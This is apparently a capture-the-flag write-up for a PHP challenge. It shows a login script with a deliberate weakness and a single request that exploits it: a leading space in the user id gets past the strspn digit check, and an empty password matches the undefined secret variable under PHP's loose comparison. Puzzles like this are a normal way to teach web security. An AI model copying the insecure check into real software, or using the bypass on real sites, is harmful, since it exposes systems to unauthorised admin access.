# MIGHTY-PHP

## Description

After being rejected, n00b launched a web service and said 'Those so called h4ck3rs can never hack this to find the flag'. To be on the safe side, he even deleted the file 'secret.php' that contain admin password.
Now it's upto you to maintain h4ck3rs reputation.

Hint: http://php.net/manual/en/function.strspn.php
Do you know what java or c++ do if an undeclared varible is used? but zer0 is invented in INDIA

## Task

```php
<?php
try{
	include 'secret.php';    //contains the secretpassword but deleted by Owner
	include 'flag.php';		 //contains the FLAG
}
catch(Exception $e) {
}
 
$msg = '';
$admin_id = 3735928559;

if (array_key_exists(userid, $_REQUEST) && array_key_exists(pass, $_REQUEST)){
	if (!strspn($_REQUEST['userid'], "123456789")){

		if ($_REQUEST['userid'] == $admin_id && $_REQUEST['pass'] == $secretpassword){
			$msg = 'You are admin' . '<br>';
			$msg.=$flag;
		}
		else {
			$msg= 'Try harder, you can do it.';
		}
	}
	else {
		$msg= 'Don\'t give up so quickly.';
	}
}
else{
	$msg = 'At least make some effort';
}
?>
```

## Solution

Send request:

http://hack.bckdr.in:16025/?userid= 3735928559&pass=